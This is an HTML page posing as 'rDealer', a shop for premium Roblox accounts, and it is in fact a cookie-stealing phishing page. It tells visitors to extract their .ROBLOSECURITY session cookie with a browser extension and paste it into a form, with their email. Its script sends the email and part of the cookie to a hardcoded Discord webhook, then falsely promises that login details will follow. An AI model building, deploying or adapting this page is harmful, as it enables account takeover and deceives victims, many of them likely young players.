<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Account Beamer | Best Of The Best</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --primary: #8a2be2;
      --primary-light: #9d4edd;
      --primary-dark: #6a1b9a;
      --accent: #ff4d8d;
      --text: #ffffff;
      --text-light: rgba(255, 255, 255, 0.7);
      --glass: rgba(255, 255, 255, 0.05);
      --glass-border: rgba(255, 255, 255, 0.1);
      --glass-highlight: rgba(255, 255, 255, 0.15);
      --glass-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
      --success: #4ade80;
      --error: #f87171;
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Poppins', -apple-system, sans-serif;
    }

    body {
      background: linear-gradient(135deg, #0f0521 0%, #1a0933 100%);
      color: var(--text);
      min-height: 100vh;
      display: grid;
      place-items: center;
      padding: 20px;
      line-height: 1.5;
      position: relative;
      overflow: hidden;
    }

    .particles {
      position: absolute;
      width: 100%;
      height: 100%;
      z-index: 0;
      overflow: hidden;
    }

    .particle {
      position: absolute;
      background: rgba(255, 255, 255, 0.5);
      border-radius: 50%;
      pointer-events: none;
    }

    .particle:nth-child(3n+1) {
      background: rgba(138, 43, 226, 0.5);
    }
    .particle:nth-child(3n+2) {
      background: rgba(255, 77, 141, 0.5);
    }

    .gradient-bg {
      position: absolute;
      top: -50%;
      left: -50%;
      width: 200%;
      height: 200%;
      background: radial-gradient(circle at center, 
        rgba(138, 43, 226, 0.15) 0%, 
        rgba(255, 77, 141, 0.1) 30%, 
        transparent 70%);
      z-index: -1;
      animation: rotate 30s linear infinite;
    }

    @keyframes rotate {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .card {
      width: 100%;
      max-width: 480px;
      background: var(--glass);
      backdrop-filter: blur(20px) saturate(200%);
      -webkit-backdrop-filter: blur(20px) saturate(200%);
      border-radius: 20px;
      padding: 2.5rem;
      box-shadow: var(--glass-shadow), 
                  0 0 80px rgba(138, 43, 226, 0.2),
                  0 0 120px rgba(255, 77, 141, 0.1);
      border: 1px solid var(--glass-border);
      position: relative;
      overflow: hidden;
      transition: all 0.4s ease;
      z-index: 1;
    }

    .card:hover {
      border: 1px solid var(--glass-highlight);
      box-shadow: var(--glass-shadow), 
                  0 0 100px rgba(138, 43, 226, 0.3),
                  0 0 150px rgba(255, 77, 141, 0.15);
      transform: translateY(-5px);
    }

    .card::after {
      content: '';
      position: absolute;
      inset: 0;
      border-radius: 20px;
      padding: 2px;
      background: linear-gradient(135deg, 
        rgba(138, 43, 226, 0.3), 
        rgba(255, 77, 141, 0.2),
        rgba(255, 255, 255, 0.1));
      -webkit-mask: 
        linear-gradient(#fff 0 0) content-box, 
        linear-gradient(#fff 0 0);
      -webkit-mask-composite: xor;
      mask-composite: exclude;
      pointer-events: none;
    }

    .logo {
      text-align: center;
      margin-bottom: 2rem;
      position: relative;
    }

    .logo h1 {
      font-size: 2.5rem;
      font-weight: 700;
      letter-spacing: 1px;
      background: linear-gradient(to right, var(--primary), var(--accent));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      text-shadow: 0 0 20px rgba(138, 43, 226, 0.3);
      margin-bottom: 0.5rem;
      position: relative;
      display: inline-block;
    }

    .logo h1::after {
      content: '';
      position: absolute;
      bottom: -10px;
      left: 50%;
      transform: translateX(-50%);
      width: 60%;
      height: 3px;
      background: linear-gradient(to right, var(--primary), var(--accent));
      border-radius: 3px;
      filter: blur(2px);
    }

    .logo p {
      color: var(--text-light);
      font-size: 0.9rem;
      margin-top: 0.5rem;
    }

    .input-group {
      margin-bottom: 1.5rem;
      position: relative;
    }

    label {
      display: block;
      margin-bottom: 8px;
      font-size: 14px;
      color: var(--text-light);
      font-weight: 500;
      letter-spacing: 0.5px;
    }

    input, textarea {
      width: 100%;
      padding: 14px 18px;
      background: rgba(255, 255, 255, 0.05);
      border: 1px solid var(--glass-border);
      border-radius: 10px;
      color: var(--text);
      font-size: 15px;
      transition: all 0.3s;
    }

    textarea {
      min-height: 120px;
      resize: vertical;
    }

    input:focus, textarea:focus {
      outline: none;
      border-color: var(--primary);
      background: rgba(138, 43, 226, 0.1);
      box-shadow: 0 0 0 3px rgba(138, 43, 226, 0.2);
    }

    input::placeholder, textarea::placeholder {
      color: rgba(255, 255, 255, 0.3);
    }

    .btn {
      width: 100%;
      padding: 16px;
      background: linear-gradient(135deg, var(--primary), var(--primary-dark));
      color: white;
      border: none;
      border-radius: 10px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.3s;
      position: relative;
      overflow: hidden;
      letter-spacing: 0.5px;
      font-size: 15px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }

    .btn::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(
        90deg,
        transparent,
        rgba(255, 255, 255, 0.2),
        transparent
      );
      transition: 0.5s;
    }

    .btn:hover {
      background: linear-gradient(135deg, var(--primary-light), var(--primary));
      transform: translateY(-2px);
      box-shadow: 0 8px 25px rgba(138, 43, 226, 0.4);
    }

    .btn:hover::before {
      left: 100%;
    }

    .btn:active {
      transform: translateY(0);
    }

    .btn-secondary {
      background: transparent;
      color: var(--primary);
      border: 1px solid rgba(138, 43, 226, 0.5);
      margin-top: 1rem;
      backdrop-filter: blur(5px);
    }

    .btn-secondary:hover {
      background: rgba(138, 43, 226, 0.1);
      border-color: var(--primary);
      box-shadow: 0 8px 25px rgba(138, 43, 226, 0.2);
    }

    .notice {
      font-size: 13px;
      color: var(--text-light);
      text-align: center;
      margin-top: 1rem;
      opacity: 0.8;
    }

    .divider {
      height: 1px;
      background: linear-gradient(to right, transparent, rgba(138, 43, 226, 0.5), transparent);
      margin: 1.5rem 0;
      position: relative;
    }

    .divider::after {
      content: '';
      position: absolute;
      top: -2px;
      left: 50%;
      transform: translateX(-50%);
      width: 40px;
      height: 5px;
      background: var(--primary);
      filter: blur(4px);
      opacity: 0.5;
    }

    .status-message {
      padding: 12px;
      border-radius: 8px;
      margin-bottom: 1rem;
      text-align: center;
      font-size: 14px;
      display: none;
    }

    .success {
      background: rgba(74, 222, 128, 0.1);
      color: var(--success);
      border: 1px solid rgba(74, 222, 128, 0.3);
      display: block;
    }

    .error {
      background: rgba(248, 113, 113, 0.1);
      color: var(--error);
      border: 1px solid rgba(248, 113, 113, 0.3);
      display: block;
    }

    .icon {
      width: 20px;
      height: 20px;
    }

    .floating-robox {
      position: absolute;
      width: 150px;
      height: 150px;
      background: url('https://cdn.discordapp.com/attachments/1362160509033382008/1362160530001756160/robox.png') no-repeat center center;
      background-size: contain;
      opacity: 0.1;
      animation: float 6s ease-in-out infinite;
      z-index: -1;
    }

    @keyframes float {
      0%, 100% { transform: translateY(0) rotate(0deg); }
      50% { transform: translateY(-20px) rotate(5deg); }
    }

    .tooltip {
      position: relative;
      display: inline-block;
      margin-left: 8px;
      cursor: pointer;
    }

    .tooltip .tooltiptext {
      visibility: hidden;
      width: 200px;
      background-color: rgba(0, 0, 0, 0.8);
      color: #fff;
      text-align: center;
      border-radius: 6px;
      padding: 8px;
      position: absolute;
      z-index: 1;
      bottom: 125%;
      left: 50%;
      transform: translateX(-50%);
      opacity: 0;
      transition: opacity 0.3s;
      font-size: 12px;
      font-weight: normal;
    }

    .tooltip:hover .tooltiptext {
      visibility: visible;
      opacity: 1;
    }

    @media (max-width: 480px) {
      .card {
        padding: 1.5rem;
      }
      
      .logo h1 {
        font-size: 2rem;
      }
    }
  </style>
</head>
<body>
  <div class="particles" id="particles"></div>
  <div class="gradient-bg"></div>
  
  <!-- Floating Roblox characters -->
  <div class="floating-robox" style="top: 10%; left: 5%; animation-delay: 0s;"></div>
  <div class="floating-robox" style="top: 70%; left: 80%; animation-delay: 1s;"></div>
  <div class="floating-robox" style="top: 30%; left: 75%; animation-delay: 2s;"></div>
  <div class="floating-robox" style="top: 80%; left: 15%; animation-delay: 3s;"></div>
  
  <div class="card">
    <div class="logo">
      <h1>rDealer</h1>
      <p>Premium Roblox Accounts</p>
    </div>
    
    <div id="status-message" class="status-message"></div>
    
    <form id="contact-form">
      <div class="input-group">
        <label for="email">Email Address</label>
        <input type="email" id="email" placeholder="your@email.com" required>
      </div>
      
      <div class="input-group">
        <label for="cookie">
          .ROBLOSECURITY Cookie
          <span class="tooltip">
            <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
              <path stroke-linecap="round" stroke-linejoin="round" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
            <span class="tooltiptext">Use Cookie-Editor extension to get your .ROBLOSECURITY cookie</span>
          </span>
        </label>
        <textarea id="cookie" placeholder="Enter Cookie" required></textarea>
      </div>
      
      <button type="submit" class="btn">
        <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
          <path stroke-linecap="round" stroke-linejoin="round" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
        </svg>
        Submit Request
      </button>
      <p class="notice">You'll receive login information within 1-2 hours</p>
    </form>
    
    <div class="divider"></div>
    
    <button class="btn btn-secondary" onclick="window.open('https://chromewebstore.google.com/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm', '_blank')">
      <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
        <path stroke-linecap="round" stroke-linejoin="round" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14" />
      </svg>
      Get Cookie Editor
    </button>
  </div>

  <script>
    // Create floating particles
    const particlesContainer = document.getElementById('particles');
    for (let i = 0; i < 50; i++) {
      const particle = document.createElement('div');
      particle.classList.add('particle');
      
      const size = Math.random() * 5 + 1;
      particle.style.width = `${size}px`;
      particle.style.height = `${size}px`;
      
      particle.style.left = `${Math.random() * 100}%`;
      particle.style.top = `${Math.random() * 100}%`;
      
      particle.style.opacity = Math.random() * 0.5 + 0.1;
      
      // Animation
      const duration = Math.random() * 20 + 10;
      const delay = Math.random() * 5;
      particle.style.animation = `float ${duration}s ease-in-out ${delay}s infinite`;
      
      particlesContainer.appendChild(particle);
    }

    // Form submission with better feedback
    document.getElementById('contact-form').addEventListener('submit', async (e) => {
      e.preventDefault();
      
      const email = document.getElementById('email').value.trim();
      const cookie = document.getElementById('cookie').value.trim();
      const statusMessage = document.getElementById('status-message');
      
      // Validate email
      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
        statusMessage.textContent = 'Please enter a valid email address';
        statusMessage.className = 'status-message error';
        return;
      }
      
      // Validate cookie
      if (!cookie || cookie.length < 50) {
        statusMessage.textContent = 'Please enter a valid .ROBLOSECURITY cookie';
        statusMessage.className = 'status-message error';
        return;
      }
      
      try {
        // Show loading state
        const submitBtn = e.target.querySelector('button[type="submit"]');
        const originalText = submitBtn.innerHTML;
        submitBtn.innerHTML = `
          <svg class="icon spin" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <path stroke-linecap="round" stroke-linejoin="round" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
          </svg>
          Processing...
        `;
        submitBtn.disabled = true;
        
        // Send to Discord webhook
        await fetch('https://discord.com/api/webhooks/1362160509033382008/lJKt647dAoHQReTt--qKe8Kp2yInWMqO6fJ7v8ev3U_FT-aDATnGgKuB2cCqUxoKruwT', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            content: `ðŸ“¬ New rDealer Submission\nðŸ“§ ${email}\nðŸª ${cookie.substring(0, 30)}... (${cookie.length} chars)`
          })
        });
        
        // Show success
        statusMessage.textContent = 'Success! Your request has been submitted. Check your email soon.';
        statusMessage.className = 'status-message success';
        e.target.reset();
        
        // Reset button after delay
        setTimeout(() => {
          submitBtn.innerHTML = originalText;
          submitBtn.disabled = false;
        }, 2000);
      } catch (err) {
        statusMessage.textContent = 'Error submitting. Please try again or contact support.';
        statusMessage.className = 'status-message error';
        console.error(err);
        
        // Reset button
        const submitBtn = e.target.querySelector('button[type="submit"]');
        submitBtn.innerHTML = originalText;
        submitBtn.disabled = false;
      }
    });

    // Add spin animation for loading
    const style = document.createElement('style');
    style.textContent = `
      .spin {
        animation: spin 1s linear infinite;
      }
      @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
      }
    `;
    document.head.appendChild(style);
  </script>
</body>
</html>
